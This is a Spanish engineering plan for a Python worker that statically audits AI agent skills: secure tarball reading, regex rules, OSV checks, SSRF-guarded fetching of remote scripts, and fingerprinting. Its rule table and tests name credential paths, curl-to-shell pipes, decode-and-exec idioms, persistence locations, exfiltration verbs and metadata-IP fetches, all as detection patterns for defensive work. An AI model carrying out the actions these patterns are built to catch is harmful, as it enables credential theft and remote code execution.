# Fase 4 · Primer análisis, sin IA: plan de implementación

> **Para quien ejecuta:** Claude orquesta y revisa; un worker de Antigravity (`agy`, modelo `gemini-3.8-flash-high`)
> programa cada tarea. Claude revisa el reporte y el código de cada ronda, y corre lo que el sandbox del worker no deja:
> `uv lock`, la migración, Ruff y pytest con base de datos, lint, build y el pre-commit. Los pasos usan casillas
> (`- [ ]`) para seguir el avance.

**Objetivo:** que los trabajos de la cola se analicen de verdad, sin IA: un worker en Python descarga la skill con
seguridad, hace el inventario, pasa las reglas, analiza la instalación (con los scripts remotos y el paso 2 de la
huella), calcula el veredicto y la cobertura, y la página de la skill muestra los hallazgos reales.

**Arquitectura:**
- El worker vive en `worker/` y es un proceso aparte que toma trabajos de `analysis_job` con
  `SELECT … FOR UPDATE SKIP LOCKED`. Lee y escribe las tablas de Prisma con SQL (psycopg). Prisma sigue siendo la única
  fuente del esquema.
- El análisis es una cadena de funciones puras sobre un `Snapshot` en memoria (ruta → bytes), con pruebas pytest sin
  red ni base de datos. Solo `github.py`, `fetch.py`, `osv.py` y `db.py` hablan con el exterior.
- La web guarda al enviar la lista de archivos de la skill (`sourceFiles`), así que el worker no repite la detección de
  skills. Para leer el resultado, la web convierte las tablas nuevas al tipo `SkillAnalysis` que ya usa la página.

**Stack:** Python 3.14, uv, psycopg 3, la librería estándar (`urllib`, `http.client`, `tarfile`, `hashlib`), Ruff,
pytest y la API de OSV. En la web: Next.js 16, Prisma y Zod.

**Diseño:** `docs/superpowers/specs/2026-10-25-auditor-skills-design.md`, apartados 4, 5, 6 (análisis), 7.1, 7.2, 7.4, 8,
11 (worker, cola y controles), 12, 13 (el código se muestra desde GitHub) y 17 (fase 4).

## Restricciones globales

- **Repositorio y rama:** `~/Desktop/auditor-skills`, rama `feat/python-worker`.
- **Dependencias del worker** (licencias comprobadas en GitHub el 2026-10-27):
  - de ejecución, solo [psycopg](https://github.com/psycopg/psycopg) (LGPL-3.0; se usa como librería sin modificarla) con
    el extra `binary`;
  - de desarrollo, [Ruff](https://github.com/astral-sh/ruff) (MIT) y [pytest](https://github.com/pytest-dev/pytest)
    (MIT);
  - todo con `==` exacto en `worker/pyproject.toml`, `[tool.uv] exclude-newer = "2026-10-20T00:00:00Z"` (nada publicado
    en la última semana) y `worker/uv.lock` en el repositorio. No hay dependencias nuevas en la web.
- **Nunca se ejecuta nada de la skill.** Nada de `subprocess`, `exec`, `eval` ni escribir los archivos a disco: el
  análisis lee bytes en memoria.
- **Red del worker:** solo `api.github.com` y `codeload.github.com` (descarga), `api.osv.dev` (OSV) y las URLs de scripts
  remotos a través de `fetch_public` (tarea 6). El token de GitHub nunca sale de `api.github.com`.
- **Límites:** los de `lib/auditor/limits.ts`, copiados en `worker/src/auditor_worker/limits.py` con el comentario de
  que en la fase 7 pasan a la base: 500 archivos, 25 MB en total y 512 KB por archivo. Además: tarball de 100 MB como
  máximo descargado y 1 GiB descomprimido como máximo recorrido.
- **Sin resultados parciales:** todo lo de una versión se guarda en una sola transacción al final.
- **Fuera de esta fase:** IA, ejecución aislada, binarios (cuentan como no revisables), «Cambios», el catálogo y las
  métricas del inicio (siguen con datos inventados), y la imagen Docker del worker (fase 10).
- **Rutas de demostración:** `/analysis/demo-*`, `/mockups` y las skills de `lib/auditor/mock-data.ts` siguen
  funcionando: si el slug no está en la base, la página usa los datos inventados.
- **Prisma:** solo migraciones nuevas. Claude las crea con `bun run db:migrate -- --name <nombre>` en el contenedor de la
  app y después corre `bunx prisma generate` en el contenedor (memoria `cc70a020`).
- **Variables del worker:** en los archivos propios del auditor (diseño, apartado 11): `docs/en|es/auditor-environment-
  variables.md`, indicando que las usa el worker, y el bloque «Auditor de skills» de `.env.example`.
- **Idioma y formato:** lo técnico en inglés; el texto visible y los motivos de fallo en español con la ortografía
  correcta. 120 caracteres por línea en TS y en Python. El nombre de la referencia visual no aparece en ningún sitio.
- **El worker de Antigravity no hace:** Git, `bun install`, `uv sync`, `uv lock`, `uv add`, Prisma, Docker, `bun run dev`
  ni `bun run build`; tampoco cambios en `components/ui/`, ni leer `.env`, ni crear archivos fuera del repositorio. Si un
  permiso le corta el paso, lo dice en el reporte y no busca rodeos.
- **Commits:** sin atribución a IA. La persona sube la rama e integra.

## Decisiones de Claude (revísalas)

1. **Sin `httpx` ni `requests`:** `httpx` no publica versión desde diciembre de 2024. Con `urllib` y `http.client` de la
   librería estándar basta, y hay una dependencia menos en la parte que maneja código hostil.
2. **La web guarda `sourceFiles` al enviar** (la lista de archivos con su ruta, SHA, tamaño y modo). Así la detección de
   skills vive solo en TypeScript, y el worker comprueba cada archivo del tarball contra su SHA de blob.
3. **Todo en memoria:** el worker no escribe la skill a disco en esta fase (lo hará la caja aislada de la fase 8). Así no
   hay riesgo de rutas que salgan de la carpeta ni de enlaces simbólicos al extraer.
4. **Reglas por líneas con expresiones regulares**, por familia de lenguaje (Python, JS/TS, shell, PowerShell, Markdown y
   texto). Sin árboles de sintaxis: es igual para todos los lenguajes y barato, y lo que se escape en varias líneas lo
   cubrirá la IA en la fase 5.
5. **En esta fase no se infiere «envía secretos fuera».** Leer un secreto y hacer una petición en el mismo archivo son
   dos hallazgos separados (alta cada uno). Juntarlos daría «Peligrosa» a cualquier skill que use `GITHUB_TOKEN` con
   `api.github.com`. Ese cruce es trabajo de la IA y de la caja.
6. **Gravedades no fijadas en el diseño**, propuestas en la tabla de la tarea 4: ejecución con comando literal = baja;
   `eval` o `exec` dinámicos = media; variable de entorno con un secreto, declarada = media; paquete instalado declarado =
   baja; vulnerabilidad conocida en OSV = media; paquete malicioso conocido (`MAL-…`) = crítica.
7. **OSV por su API** (`api.osv.dev/v1/querybatch`, la misma base que usa osv-scanner) en lugar del binario de
   osv-scanner. No hace falta instalar nada. Si OSV no responde, va a «lo que no se pudo comprobar».
8. **Cobertura por bytes en todos los archivos** (texto y binarios), para que los tres porcentajes sumen 100 con la misma
   unidad.
9. **Scripts remotos:** como máximo 5 por versión y 1 MB cada uno. Un `curl … | bash` dentro de un script remoto se
   reporta, pero no se descarga (profundidad 1).
10. **El README no entra en la huella** (como dice el diseño). Sus comandos se analizan, pero si solo cambia el README
    no se crea otra versión. Es un hueco conocido; lo anoto para revisarlo en la fase 6.
11. **El worker en local corre en el Mac** con `uv run auditor-worker`, contra la base de Docker en `127.0.0.1:5432`. La
    imagen Docker y Fargate son de la fase 10.

## Puntos que más pueden fallar (cada uno tiene su prueba en la tarea indicada)

1. **Tarball hostil:** una entrada que no coincide con su SHA, un enlace simbólico donde se esperaba un archivo, un
   archivo más grande que lo que dice el árbol o una bomba de compresión. El trabajo falla con un motivo claro y sin
   leer más de lo permitido (tarea 3).
2. **Script remoto hacia la red interna:** una URL a `127.0.0.1`, `169.254.169.254`, `10.x`, un nombre que resuelve a una
   IP privada o una redirección hacia ella. No se descarga, y el hallazgo `curl … | bash` sigue en pie (tarea 6).
3. **La huella de Python no coincide con la de TypeScript:** con rutas no ASCII, el orden de JavaScript (unidades
   UTF-16) es distinto del de Python. Se ordena con `key=lambda p: p.encode("utf-16-be")` y hay un vector compartido en
   las dos suites de pruebas (tarea 6).
4. **Dos comprobaciones de huella a la vez** encuentran el mismo script remoto cambiado: solo una versión nueva se queda
   con esa huella; el otro trabajo apunta a esa versión y devuelve el análisis apartado (tarea 7).
5. **El worker se cae a mitad de un trabajo:** un trabajo en `running` sin latido durante 10 minutos vuelve a tomarse; al
   tercer intento falla con «Se agotaron los intentos» y devuelve el análisis apartado (tarea 2).

---

### Tarea 1: Modelo de datos y lo que guarda la web al enviar

**Archivos:**
- Modificar: `prisma/schema.prisma`. Crear la migración `prisma/migrations/<fecha>_auditor_analysis/`.
- Modificar: `lib/auditor/submission/service.ts` y `lib/auditor/github/client.ts` (tipo `GithubRepository` con
  `full_name`).

**Esquema** (mismo estilo de nombres que los modelos del auditor):
- Enums nuevos: `FindingSeverity { critical high medium low }`, `Verdict { dangerous review no_serious_findings }`,
  `FileReview { source decompiled unreviewable }` y `FileOrigin { skill plugin readme remote }`.
- `Skill`: `displayOwner String?` y `displayRepo String?` (de `full_name`; si son nulos se muestra `owner`/`repo`).
- `SkillVersion`: `sourceFiles Json @default("[]")`, `verdict Verdict?`, `analyzedAt DateTime?`, `report Json?` y las
  relaciones `files VersionFile[]` y `findings Finding[]`.
- `AnalysisJob`: `step String?`, `progressCurrent Int?`, `progressTotal Int?` y `heartbeatAt DateTime?`.
- `VersionFile` (`@@map("version_file")`): `id`, `versionId`, `path` (la URL si es remoto), `origin FileOrigin`,
  `blobSha String?`, `contentSha256`, `remoteUrl String?`, `downloadedAt DateTime?`, `kind` (`code | markdown | config |
  binary | image | other`), `language String?`, `lineCount`, `byteSize`, `review FileReview`, `flags String[]`;
  `@@unique([versionId, path])`; borrado en cascada con la versión.
- `Finding` (`@@map("finding")`): `id`, `versionId`, `ruleId`, `category`, `severity FindingSeverity`, `declared`,
  `origin String @default("rules")`, `filePath`, `line`, `title`, `evidence` (la línea citada, como máximo 300
  caracteres), `createdAt`; `@@index([versionId, severity])`; borrado en cascada.

**Web al enviar:** al crear la versión se guarda `sourceFiles` con los `TreeEntry` de la skill (`path`, `type`, `sha`,
`size`, `mode`), y al crear o encontrar la skill, `displayOwner` y `displayRepo` a partir de `full_name`.

**Pasos:**
- [ ] El worker escribe el esquema y los cambios de `service.ts` y `client.ts`.
- [ ] Claude crea la migración y regenera el cliente. La migración solo añade tipos, columnas, tablas e índices.
- [ ] Validar: `bunx prisma validate`, typecheck, lint y `bun run test`, sin errores.

### Tarea 2: Esqueleto del worker, controles y cola

**Archivos:**
- Crear `worker/`: `pyproject.toml`, `.python-version` (`3.14`), `README.md` (cómo correrlo en local) y `uv.lock` (lo
  genera Claude).
- Crear `worker/src/auditor_worker/`: `__main__.py`, `config.py`, `limits.py`, `db.py`, `errors.py` y `pipeline.py` (por
  ahora solo marca el trabajo como hecho; las tareas 3 a 7 lo completan).
- Crear `worker/tests/`: `conftest.py`, `test_config.py` y `test_db.py`.
- Modificar: `.github/workflows/ci.yml` (job «Worker»), `.husky/pre-commit` (paso 5),
  `scripts/check-exact-versions.ts` (también `worker/pyproject.toml`), `AGENTS.md` (sección final propia), los dos
  `auditor-environment-variables.md` y `.env.example`.

**Interfaces que produce:**
- `pyproject.toml`: proyecto `auditor-worker`, `requires-python = "==3.14.*"`, script `auditor-worker =
  "auditor_worker.__main__:main"`, Ruff con `line-length = 120` y las reglas `E, F, W, I, B, UP, S`, y pytest con el
  marcador `db`.
- `config.py` → `load_config(env: Mapping[str, str]) -> Config`, con estos campos:
  - `database_url` (de `DATABASE_URL`, obligatoria);
  - `github_token: str | None` (de `GITHUB_TOKEN`);
  - `poll_seconds` (de `WORKER_POLL_SECONDS`, 3 por defecto) y `max_attempts` (de `WORKER_MAX_ATTEMPTS`, 3);
  - `stale_after_seconds` (fija en 600).
  Falta `DATABASE_URL` → `ConfigError` con un mensaje legible.
- `errors.py`: `TransientError(Exception)` (se reintenta) y `AnalysisFailure(Exception)` con `reason: str` en español (no
  se reintenta).
- `db.py`:
  - `claim_job(conn, stale_after_seconds) -> ClaimedJob | None`. Toma el más antiguo que esté `queued` o en `running` sin
    latido desde hace más de `stale_after_seconds`, con `FOR UPDATE SKIP LOCKED`. Lo pasa a `running`, suma 1 a
    `attempts` y pone `startedAt` y `heartbeatAt`.
  - `ClaimedJob` lleva `id`, `kind`, `attempts`, `version_id`, `skill_id`, `owner`, `repo`, `skill_path`,
    `commit_sha`, `source_files: list[TreeEntry]` y `user_id`.
  - `report_progress(conn, job_id, step: str, current: int | None, total: int | None) -> None` (también renueva el
    latido).
  - `fail_job(conn, job_id, reason: str) -> None`: `failed`, `failureReason`, `finishedAt` y `creditReturnedAt = now()`
    si tenía `creditMonth`.
  - `requeue_job(conn, job_id) -> None`: vuelve a `queued`.
- `__main__.py` → `main()`: un bucle que toma un trabajo, lo pasa a `pipeline.run_job` y espera `poll_seconds` si no hay.
  - Un `TransientError` con intentos por debajo de `max_attempts` → `requeue_job`.
  - Cuando se acaban los intentos, o con cualquier otra excepción → `fail_job`. Con `AnalysisFailure` se guarda su
    `reason`; si no, «Error interno del análisis», y el detalle va solo al log.
  - Un trabajo tomado con `attempts > max_attempts` falla con «Se agotaron los intentos».
  - Termina limpio con SIGTERM y SIGINT.

**CI y pre-commit:**
- Job `worker`, con el nombre «Worker»:
  - servicio `postgres:17-alpine` con usuario, contraseña y base `ci`;
  - `bun install --frozen-lockfile` y `bunx prisma migrate deploy`;
  - `astral-sh/setup-uv` fijado por SHA de commit, como las otras acciones del archivo;
  - después, en `worker/`: `uv sync --locked`, `uv run ruff check`, `uv run ruff format --check` y
    `uv run pytest` con `WORKER_TEST_DATABASE_URL`.
- Paso `5/5` del pre-commit: solo si `git diff --cached --name-only` toca `worker/`, corre `uv run ruff check`,
  `uv run ruff format --check` y `uv run pytest -m "not db"` en `worker/`. Los mensajes `1/4…4/4` pasan a `1/5…5/5`.
- `deps:check` también rechaza en `worker/pyproject.toml` toda dependencia (de ejecución o de desarrollo) que no sea
  `nombre==x.y.z` o `nombre[extra]==x.y.z`.

**`AGENTS.md`:** se añade al final una sección «Auditor de skills: reglas propias» con lo que pide el apartado 11 del
diseño. Dice que la base es AWS RDS y no Neon, y que esta sección prevalece sobre lo anterior. Explica también que el
worker vive en `worker/` y que nunca ejecuta nada de las skills, cómo se corren sus controles, dónde se documentan las
variables del auditor y dónde está el diseño.

**Pruebas:**
- `test_config.py`: valores por defecto, `WORKER_POLL_SECONDS=abc` → `ConfigError` y sin `DATABASE_URL` →
  `ConfigError`.
- `test_db.py` (marcador `db`). Usa la base de `WORKER_TEST_DATABASE_URL` con las migraciones aplicadas y vacía las
  tablas del auditor antes de cada prueba:
  - con dos conexiones a la vez y un solo trabajo en cola, solo una lo toma;
  - un trabajo en `running` con `heartbeatAt` de hace 11 minutos se vuelve a tomar, y uno de hace 1 minuto no;
  - `fail_job` en un trabajo con `creditMonth` pone `creditReturnedAt`; sin `creditMonth`, la deja nula;
  - `test_exhausted_attempts_fail`: un trabajo tomado por cuarta vez con `max_attempts = 3` acaba en `failed` con «Se
    agotaron los intentos» y `creditReturnedAt` puesta;
  - `claim_job` lee `sourceFiles` como una lista de `TreeEntry`. Esta prueba falla si una migración cambia los nombres de
    las columnas que usa el SQL.

**Pasos:**
- [ ] El worker escribe el esqueleto, las pruebas, el job de CI, el paso de pre-commit, `deps:check` y la documentación.
- [ ] Claude corre `uv lock` y `uv sync` y comprueba que las versiones fijadas son anteriores a `exclude-newer`.
- [ ] Validar: `uv run ruff check`, `uv run ruff format --check`, `uv run pytest` (con la base de prueba local),
  `bun run deps:check`, lint y typecheck, sin errores.

### Tarea 3: Descarga segura del commit

**Archivos:**
- Crear: `worker/src/auditor_worker/github.py`, `archive.py` y `snapshot.py`.
- Crear: `worker/tests/test_archive.py` y `worker/tests/test_github.py`.

**Interfaces:**
- Consume: `ClaimedJob.source_files` (tarea 2).
- Produce:
  - `TreeEntry` (en `snapshot.py`): un dataclass con `path`, `type` (`blob | tree | commit`), `sha`, `size: int | None` y
    `mode`.
  - `git_blob_sha(data: bytes) -> str`: el SHA-1 de `b"blob %d\0" % len(data) + data`.
  - `Snapshot` lleva:
    - `files: dict[str, bytes]` (solo los blobs normales de `source_files`);
    - `symlinks: dict[str, str]` (ruta → destino);
    - `submodules: list[str]`;
    - `readmes: dict[str, bytes]`: `README.md` de la raíz y de la carpeta de la skill, si existen; no se comprueban
      contra el árbol.
  - `read_snapshot(stream: BinaryIO, source_files: list[TreeEntry], skill_path: str) -> Snapshot` (en `archive.py`).
  - `download_tarball(owner, repo, commit_sha, token) -> BinaryIO` (en `github.py`). Pide
    `api.github.com/repos/{o}/{r}/tarball/{sha}` y sigue una sola redirección, solo hacia `codeload.github.com` y sin la
    cabecera `Authorization`. Si la respuesta pasa de 100 MB, falla con `AnalysisFailure`. Un 5xx, un tiempo agotado o
    un 403 por límite de peticiones → `TransientError`; un 404 → `AnalysisFailure("El repositorio o el commit ya no
    existen en GitHub")`.

**Reglas de `read_snapshot`:**
- Abre con `tarfile.open(fileobj=…, mode="r|gz")` (en flujo) sobre un lector que cuenta los bytes descomprimidos; al
  pasar de 1 GiB falla con «El repositorio es demasiado grande para analizarlo».
- Quita el primer componente de cada ruta y solo lee las entradas cuya ruta está en `source_files` (más los README).
  Nunca usa `extract` ni `extractall`.
- Para cada blob esperado:
  - tiene que ser un archivo normal de tamaño igual a `size` y como mucho 512 KB;
  - se lee con ese tope y `git_blob_sha` tiene que coincidir con su `sha`.
- Un enlace simbólico esperado (modo `120000`) tiene que ser un enlace en el tarball, con
  `git_blob_sha(linkname.encode())` igual a su `sha`.
- Los submódulos (`type == "commit"`) van a `submodules` sin buscarlos en el tarball.
- Si falta algún esperado o algo no coincide → `AnalysisFailure("El contenido descargado no coincide con el commit
  analizado")`. Más de 500 archivos o más de 25 MB en total → `AnalysisFailure` con el límite superado.

**Pruebas** (tarballs construidos en memoria con `tarfile`):
- `test_snapshot_reads_expected_files_and_skips_the_rest`;
- `test_sha_mismatch_fails`, `test_size_larger_than_tree_fails` y `test_symlink_where_file_expected_fails`;
- `test_symlink_target_is_recorded_not_followed`: un enlace a `../../etc/passwd` queda en `symlinks`;
- `test_decompression_limit`: con el tope bajado a 1 MB en la prueba, un archivo de 2 MB de ceros falla;
- `test_git_blob_sha_matches_git`: `git_blob_sha(b"hello\n") == "ce013625030ba8dba906f756967f9e9ca394464a"`;
- en `test_github.py`, con un servidor local falso: la redirección a otro dominio se rechaza y no se manda
  `Authorization` a `codeload`.

**Pasos:**
- [ ] Escribir las pruebas y comprobar que fallan.
- [ ] Implementar hasta que pasen.
- [ ] Validar: Ruff y pytest, sin errores.

### Tarea 4: Inventario y reglas

**Archivos:**
- Crear: `worker/src/auditor_worker/inventory.py`, `findings.py` y el paquete `rules/` (`__init__.py`, `patterns.py`,
  `network.py`, `execution.py`, `install.py`, `secrets.py`, `filesystem.py`, `obfuscation.py`, `markdown.py` y
  `structure.py`).
- Crear: `worker/tests/test_inventory.py` y un `test_rules_<categoría>.py` por cada módulo.

**Interfaces que produce:**
- `findings.py`: el dataclass `Finding` con estos campos:
  - `rule_id`, `category`, `severity_undeclared`, `severity_declared`;
  - `file_path`, `line`, `title`, `evidence` y `token: str | None` (el dato que puede declararlo).
  - `declared: bool = False` y `severity` se calculan en la tarea 7.
- `inventory.py` → `inventory(snapshot) -> list[InventoryItem]`. Cada `InventoryItem` lleva:
  - `path`, `blob_sha` y `byte_size`;
  - `kind` y `language` (`python | js | shell | powershell | markdown | config | None`), según la extensión o el
    *shebang*;
  - `line_count`;
  - `flags` (`binary` si hay un byte NUL en los primeros 8 KB o no es UTF-8 válido; `minified` si alguna línea pasa de
    5000 caracteres; `high-entropy` si la entropía de Shannon pasa de 5,5 bits por byte en un texto de más de 1 KB).
- `rules.scan(item, text) -> list[Finding]` aplica a cada archivo de texto las reglas de su familia. Dentro del Markdown,
  los bloques de código `sh`, `bash`, `shell`, `zsh`, `console` o sin lenguaje se tratan como shell (quitando un `$ `
  inicial). Hay como máximo 20 hallazgos por regla y archivo; los que sobran se cuentan en `suppressed`.
- `rules.scan_structure(snapshot, items) -> list[Finding]`: enlaces, submódulos y binarios.

**Reglas** («no decl.» → «decl.»; el *token* es lo que se busca en el `SKILL.md`):

| `rule_id` | Detecta | Gravedad | Token |
|---|---|---|---|
| `net.http` | petición con URL literal: `requests`, `urllib`, `fetch`, `axios`, `curl`, `wget`, `Invoke-WebRequest` | alta → media | dominio |
| `net.dynamic` | petición o `socket` sin URL literal (`fetch(url)`, `curl "$URL"`, `socket.connect`) | alta → alta | — |
| `net.dns` | `dig`, `nslookup`, `gethostbyname`, `dns.resolve` | alta → media | host |
| `exec.command` | `subprocess`, `os.system`, `child_process`, `execSync`, `spawn` con comando literal (no en shell) | baja → baja | comando |
| `exec.dynamic` | `eval`, `exec`, `compile`, `new Function`, `eval "$…"`, `sh -c "$…"` | media → media | — |
| `install.package` | `pip`, `uv pip`, `uv add`, `uvx`, `npm i`, `pnpm add`, `yarn add`, `bun add`, `npx`, `bunx`, `brew`, `apt`, `apt-get`, `gem`, `cargo`, `go install` | alta → baja | paquete |
| `install.remote-script` | `curl`/`wget … \| sh`, `bash <(curl …)`, `sh -c "$(curl …)"`, `iwr`/`irm … \| iex` | según la tarea 6 | — |
| `secrets.path` | `.env`, `~/.ssh`, `id_rsa`, `id_ed25519`, `~/.aws`, `~/.config/gh`, `.git-credentials`, `.netrc`, `.npmrc`, `.pypirc`, `~/.docker/config.json`, `~/.kube/config`, `security find-generic-password` | alta → alta | ruta |
| `secrets.env` | variable cuyo nombre contiene `TOKEN`, `SECRET`, `PASSWORD`, `API_KEY`, `ACCESS_KEY`, `PRIVATE_KEY` o `CREDENTIAL` | alta → media | nombre |
| `secrets.env-dump` | todo el entorno: `os.environ` entero, `printenv`, `env \|`, `JSON.stringify(process.env)` | alta → alta | — |
| `fs.delete-outside` | `rm -r`, `shutil.rmtree`, `os.remove`, `fs.rm` con ruta que empieza por `/`, `~`, `$HOME` o `..` | crítica → media | ruta |
| `fs.write-outside` | escritura (`open(…, "w")`, `>`, `>>`, `tee`, `cp`, `mv`, `writeFile`) a esas mismas rutas | alta → media | ruta |
| `fs.persistence` | `.bashrc`, `.zshrc`, `.profile`, `.bash_profile`, `.zprofile`, `config.fish`, `crontab`, `LaunchAgents`, `LaunchDaemons`, `systemd`, `.git/hooks`, `core.hooksPath`, `~/.claude/`, `~/.codex/`, `~/.cursor/` | crítica → media | ruta |
| `obf.decode-exec` | decodificar y ejecutar en la misma línea: `base64 -d \| sh`, `eval(atob(…))`, `exec(b64decode(…))`, `Buffer.from(…, "base64")` con `eval` | crítica → crítica | — |
| `obf.blob` | base64 o hex seguido de 200 caracteres o más en código | media → media | — |
| `obf.char-build` | 8 o más `chr(`/`String.fromCharCode` en una línea, o 20 o más escapes `\x` | media → media | — |
| `md.invisible` | U+200B–U+200F, U+202A–U+202E, U+2060–U+2064, U+2066–U+2069 y U+FEFF fuera del inicio | alta → alta | — |
| `md.html-comment` | `<!-- … -->` en Markdown | alta → alta | — |
| `md.encoded` | base64 o hex de 200 caracteres o más en Markdown | alta → alta | — |
| `md.exfil-instruction` | una línea que nombra una ruta o variable de secretos y un verbo de envío (`send`, `upload`, `post`, `curl`, `paste`, `exfiltrate`, `enviar`, `subir`, `pegar`) | crítica → crítica | — |
| `md.secret-mention` | ruta o variable de secretos sola, en Markdown | baja → baja | — |
| `md.url` | URL en Markdown (un hallazgo por dominio y archivo) | baja → baja | — |
| `struct.symlink-outside` | enlace cuyo destino sale de la carpeta de la skill | alta → alta | — |
| `struct.submodule` | submódulo (no se analiza) | media → media | — |
| `struct.binary` | archivo binario (no revisable en esta fase) | alta → media | nombre del archivo |

**Pruebas:** una por fila de la tabla, con un positivo y un negativo cercano en el lenguaje de la columna «Detecta».
Por ejemplo:
- `test_net_http_extracts_domain`: `requests.get("https://api.example.com/x")` da `token == "api.example.com"`, y una
  URL dentro de un comentario `#` de Python también cuenta;
- `test_exec_command_is_not_reported_in_shell_files`;
- `test_fs_write_inside_skill_folder_is_not_reported`: `open("./out.txt", "w")` no da nada;
- `test_md_invisible_reports_codepoint`: un U+200B en la línea 3 da `line == 3` y la evidencia con `​` escrito;
- `test_install_package_in_skill_md_code_block`: ```` ```bash\npip install foo\n``` ```` da `token == "foo"`;
- `test_suppressed_after_20_per_rule_and_file`.

En `test_inventory.py`: la detección de binarios, del *shebang* `#!/usr/bin/env bash` sin extensión, de minificado y de
entropía alta.

**Pasos:**
- [ ] Escribir las pruebas por módulo y comprobar que fallan.
- [ ] Implementar hasta que pasen.
- [ ] Validar: Ruff y pytest, sin errores.

### Tarea 5: Dependencias y OSV

**Archivos:**
- Crear: `worker/src/auditor_worker/dependencies.py` y `osv.py`.
- Crear: `worker/tests/test_dependencies.py` y `test_osv.py`.

**Interfaces que produce:**
- `Dependency` es un dataclass con `ecosystem` (`PyPI | npm`), `name`, `version: str | None`, `pinned`, `file_path` y
  `line`.
- `parse_dependencies(snapshot) -> list[Dependency]` lee:
  - `requirements*.txt` (`==` es fija; `>=`, `~=`, sin versión o `-r` no son fijas);
  - `[project].dependencies` y `[dependency-groups]` de `pyproject.toml` (con `tomllib`);
  - `dependencies` y `devDependencies` de `package.json` (fija solo si es `x.y.z`);
  - los paquetes de `install.package` con versión explícita (`pip install foo==1.2.3`, `npm i foo@1.2.3`).
- `query_osv(deps, timeout=15) -> OsvResult` hace una sola llamada a `POST https://api.osv.dev/v1/querybatch` con las
  dependencias fijas. Devuelve `advisories: dict[(ecosystem, name, version), list[str]]` y `available: bool`.
- `dependency_findings(deps, osv) -> list[Finding]`:
  - `deps.unpinned`: media → media, token = nombre;
  - `deps.known-vuln`: media → media, con los ids en la evidencia;
  - `deps.malicious`: si algún id empieza por `MAL-`, crítica → crítica.

**Pruebas:**
- `test_requirements_pinning`: `foo==1.0.0` es fija y `bar>=2` no;
- `test_package_json_range_is_unpinned`: `^1.2.3` no es fija;
- `test_osv_malicious_is_critical`;
- `test_osv_down_marks_unavailable`: un tiempo agotado da `available == False` sin lanzar excepción;
- `osv.py` con un transporte falso, sin red real.

**Pasos:**
- [ ] Escribir las pruebas y comprobar que fallan.
- [ ] Implementar hasta que pasen.
- [ ] Validar: Ruff y pytest, sin errores.

### Tarea 6: Instalación, scripts remotos y huella final

**Archivos:**
- Crear: `worker/src/auditor_worker/installation.py`, `fetch.py`, `remote.py` y `fingerprint.py`.
- Crear: `worker/tests/test_installation.py`, `test_fetch.py`, `test_remote.py` y `test_fingerprint.py`.
- Modificar: `lib/auditor/submission/fingerprint.test.ts` (vector compartido).

**Interfaces que produce:**
- `KNOWN_INSTALLERS` (en `installation.py`) es una tupla de prefijos `host + ruta`, con un comentario que dice que cada
  cambio pasa por un PR:
  - `bun.sh/install`
  - `deno.land/install.sh`
  - `sh.rustup.rs`
  - `astral.sh/uv/install.sh`
  - `get.pnpm.io/install.sh`
  - `raw.githubusercontent.com/Homebrew/install/HEAD/install.sh`
- `classify_remote(url, owner, repo) -> tuple[str, str]` devuelve `(clase, gravedad)` así (diseño 7.4, decidido el
  2026-10-26):
  - `known-installer` → `medium`;
  - `same-repo-commit` → `low`, si es `raw.githubusercontent.com/<owner>/<repo>/<sha de 40 hex>/…` o
    `github.com/<owner>/<repo>/raw/<sha>/…` y `owner/repo` coincide sin distinguir mayúsculas;
  - `same-repo-ref` → `medium`: igual, con una rama o una etiqueta;
  - `other` → `critical`: todo lo demás, incluidos otro repositorio del mismo dueño, gists y releases.
- `install_steps(skill, snapshot, findings) -> list[InstallStep]`. Cada `InstallStep` lleva `method`
  (`folder | plugin | readme`), `command`, `touches`, `source` (`ruta:línea`) y `matches_declared`:
  - siempre: `folder` con `npx skills add <displayOwner>/<displayRepo> --skill <name>` y «Copia la carpeta `<ruta>` en
    la carpeta de skills del agente»;
  - `plugin`, si la skill tiene extras de plugin: `/plugin install <plugin>` y «Activa los hooks, comandos, agentes y MCP
    del plugin»;
  - `readme`: un paso por cada línea de comando de los bloques de los README que contenga un hallazgo `install.*`, más
    `git clone` y `cp`. En `touches` va el resumen de sus hallazgos (por ejemplo, «Descarga y ejecuta un script
    remoto»).
- `fetch.py` → `fetch_public(url, *, resolver=socket.getaddrinfo, max_bytes=1_048_576, timeout=15, max_redirects=3)
  -> FetchResult`. El `resolver` se puede cambiar en las pruebas. Cumple estas reglas:
  - solo `https` y el puerto 443;
  - resuelve el nombre y rechaza las IP privadas, de loopback, link-local, multicast, reservadas o no globales
    (`ipaddress.ip_address(...).is_global`);
  - se conecta a la IP ya comprobada, con SNI y verificación del certificado para el nombre original;
  - vuelve a validar cada redirección;
  - nunca manda cabeceras de autenticación ni cookies.
  - `FetchResult` es `ok(data, final_url)` o `blocked(reason)` | `failed(reason)`.
- `remote.py` → `collect_remote_scripts(findings, owner, repo, fetcher) -> list[RemoteScript]`:
  - descarga como máximo 5 URLs distintas de `install.remote-script`;
  - cada `RemoteScript` lleva `url`, `content: bytes | None`, `sha256: str | None`, `downloaded_at` y `failure`;
  - un `curl … | sh` dentro de un script descargado no se descarga.
- `fingerprint.py` → `final_fingerprint(source_files, remotes) -> str`:
  - es el SHA-256 de las líneas `path\0sha\n`, con los archivos (`sha` de blob) y los remotos (`remote:<url>` con su
    `sha256`);
  - ordenadas con `key=lambda p: p.encode("utf-16-be")`;
  - un remoto que no se pudo descargar entra con `sha` vacío.

**Pruebas:**
- `test_fingerprint_matches_typescript`: `SKILL.md`/`"a"*40` y `scripts/run.py`/`"b"*40` dan
  `9cd639c3800300de6aedea0aa5217934519fa8b4338f7c2ebccf240470929b73`. El mismo vector se añade a
  `fingerprint.test.ts`.
- `test_fingerprint_with_remote`: añadir `remote:https://bun.sh/install` con el `sha256` de `b"echo hi\n"` da
  `d907488a8d883d94a3206f318e59e94a75895a2770a11d407d181d7a971788b7`.
- `test_fingerprint_non_ascii_order`: `["a￿", "a\U0001F600"]` queda en el mismo orden que en JavaScript, donde
  `"a\u{1F600}" < "a￿"`.
- `test_classify_remote`: los cuatro casos, `CodeLab614/Skills` frente a `codelab614/skills`, una etiqueta `v1.0` →
  `same-repo-ref` y `gist.githubusercontent.com` → `other`.
- `test_fetch_blocks_private`: `https://127.0.0.1/`, `https://169.254.169.254/`, `http://example.com/`, un nombre que
  resuelve a `10.0.0.5` (con un resolutor falso) y una redirección hacia `https://localhost/`.
- `test_fetch_size_cap`: más de `max_bytes` da `failed`.
- `test_remote_depth_one`.

**Pasos:**
- [ ] Escribir las pruebas (Python y el vector de TS) y comprobar que fallan.
- [ ] Implementar hasta que pasen.
